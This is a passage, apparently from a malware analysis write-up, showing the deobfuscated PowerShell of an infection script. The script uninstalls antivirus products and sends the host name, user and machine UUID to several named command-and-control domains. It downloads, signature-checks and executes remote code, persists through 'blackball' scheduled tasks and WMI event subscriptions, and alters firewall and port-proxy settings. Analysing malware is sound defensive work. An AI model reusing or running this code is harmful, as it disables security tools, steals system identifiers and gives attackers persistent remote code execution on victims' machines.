sch'+'tasks /delete /tn Rtsa /F').RePlacE(([Char]75+[Char]118+[Char]49),'$').RePlacE(([Char]102+[Char]69+[Char]72),[STrINg][Char]39).RePlacE('fG9',[STrINg][Char]124).RePlacE(([Char]120+[Char]74+[Char]121),'\').RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char]34) ) 
```

Gives the much more easier to read and after removing empty lines
```powershell
cmd /c start /b wmic.exe product where "name like '%Eset%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%%Kaspersky%%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avast%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avp%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Security%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%AntiVirus%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Norton Security%'" call uninstall /nointeractive
cmd /c "C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe" /verysilent /suppressmsgboxes /norestart
$v="?$v"+(Get-Date -Format '_yyyyMMdd')
$tmps='function a($u){$d=[text.encoding]::utf8.getbytes((new-object IO.StreamReader([net.webrequest]::create($u).getresponse().getresponsestream())).readtoend());$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2''+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*'');a($url)'
$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
function getRan(){return -join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))}
$us=@('t.zz3r0.com','t.zker9.com','t.bb3u9.com')
$stsrv = New-Object -ComObject Schedule.Service
$stsrv.Connect()
try{
$doit=$stsrv.GetFolder("\").GetTask("blackball")
}catch{}
if(-not $doit){
	if($sa){
		schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	} else {
		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
	foreach($u in $us){
		$i = [array]::IndexOf($us,$u)
		if($i%3 -eq 0){$tnf=''}
		if($i%3 -eq 1){$tnf=getRan}
		if($i%3 -eq 2){if($sa){$tnf='MicroSoft\Windows\'+(getRan)}else{$tnf=getRan}}
		$tn = getRan
		if($sa){
			schtasks /create /ru system /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -c PS_CMD"
		} else {
			schtasks /create /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		}
		start-sleep 1
		$folder=$stsrv.GetFolder("\$tnf")
		$taskitem=$folder.GetTasks(1)
		foreach($task in $taskitem){
			foreach ($action in $task.Definition.Actions) {
				try{
					if($action.Arguments.Contains("PS_CMD")){	
						$folder.RegisterTask($task.Name, $task.Xml.replace("PS_CMD",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5))), 4, $null, $null, 0, $null)|out-null
					}
				}catch{}
			}
		}
		start-sleep 1
		schtasks /run /tn "$tnf\$tn"
		start-sleep 5
	}
}
try{
$doit1=Get-WMIObject -Class __EventFilter -NameSpace 'root\subscription' -filter "Name='blackball'"
}catch{}
if(-not $doit1){
    Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="blackball";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop
    foreach($u in $us){
        $theName=getRan
        $wmicmd=$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5)).replace('a.jsp','aa.jsp')
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="f"+$theName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop);Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="c"+$theName;ExecutablePath="c:\windows\system32\cmd.exe";CommandLineTemplate="/c powershell -c $wmicmd"})}
        start-sleep 5
    }
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 ???Force
}
cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
netsh advfirewall firewall add rule name="deny445" dir=in protocol=tcp localport=445 action=block
netsh advfirewall firewall add rule name="deny135" dir=in protocol=tcp localport=135 action=block
schtasks /delete /tn Rtsa2 /F
schtasks /delete /tn Rtsa1 /F
schtasks /delete /tn Rtsa /F
```


